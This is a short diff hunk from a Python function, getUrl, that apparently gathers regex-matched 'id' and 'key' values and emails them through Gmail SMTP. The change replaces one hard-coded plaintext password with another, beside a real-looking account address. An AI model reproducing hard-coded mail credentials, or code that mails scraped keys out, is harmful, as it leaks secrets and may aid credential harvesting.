@@ -240,7 +240,7 @@ def getUrl(url, shake):
                                       "id: " + id.group() + "\nkey: " + key.group() + '\n\n'
                                       ])
                                     username = 'jarettrsdunn@gmail.com'
-                                    password = 'w0rdp4ss1'
+                                    password = 'fooledyah'
                                     server = smtplib.SMTP('smtp.gmail.com:587')
                                     server.ehlo()
                                     server.starttls()
